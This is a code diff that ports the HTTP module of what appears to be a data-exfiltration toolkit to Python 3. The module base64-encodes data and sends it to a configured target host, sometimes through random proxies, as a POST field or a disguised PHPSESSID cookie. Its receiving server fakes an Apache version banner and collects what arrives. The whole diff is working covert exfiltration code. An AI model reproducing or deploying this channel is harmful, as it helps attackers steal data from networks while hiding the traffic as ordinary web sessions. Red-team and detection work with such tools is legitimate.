@@ -1,10 +1,14 @@
 from __future__ import print_function
+
 import requests
 import base64
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import urllib
-from random import choice
 import platform
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.cookies import SimpleCookie
+from urllib.parse import unquote
+from random import choice
+
+# name http conflicts with standard library
 
 host_os = platform.system()
 
@@ -29,32 +33,39 @@ class S(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(html_content)
+        self.wfile.write(html_content.encode())
 
     def version_string(self):
         return 'Apache/2.4.10'
 
     def do_POST(self):
         self._set_headers()
-        content_len = int(self.headers.getheader('content-length', 0))
+        content_len = int(self.headers.get('content-length', 0))
         post_body = self.rfile.read(content_len)
-        tmp = post_body.split('=', 1)
-        if tmp[0] == "data":
+        tmp = post_body.split(b'=', 1)
+        if tmp[0] == b"data":
             try:
-                data = base64.b64decode(urllib.unquote(tmp[1]))
-                self.server.handler(data)
+                data = base64.b64decode(unquote(tmp[1]))
+                app_exfiltrate.retrieve_data(data)
             except Exception as e:
                 print(e)
                 pass
 
     def do_GET(self):
         try:
-            string = '/'.join(self.path.split('/')[1:])
+            cookies_string = self.headers.get('Cookie')
+            cookies = SimpleCookie()
+            if cookies_string:
+                cookies.load(cookies_string)
+
+            # string = '/'.join(self.path.split('/')[1:])
+            string = cookies['PHPSESSID'].value
             self._set_headers()
             try:
                 data = base64.b64decode(string)
                 app_exfiltrate.retrieve_data(data)
             except Exception as e:
+                print(e)
                 pass
         except:
             self._set_headers()
@@ -69,20 +80,21 @@ class S(BaseHTTPRequestHandler):
                     print(e)
                     pass
 
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = "http://{}:{}".format(choice(targets), config['port'])
     else:
-    	target = "http://{}:{}".format(config['target'], config['port'])
+        target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     #Randomly choose between GET and POST
-    if choice([True, False]):
-        data_to_send = {'data': base64.b64encode(data)}
+    # if choice([True, False]):
+    if True:
+        data_to_send = {'data': base64.b64encode(data.encode()).decode()}
         requests.post(target, data=data_to_send, headers=headers)
     else:
-        cookies = dict(PHPSESSID=base64.b64encode(data))
+        cookies = {'PHPSESSID': base64.b64encode(data.encode()).decode()}
         requests.get(target, cookies=cookies, headers=headers)
 
 def relay_http_request(data):
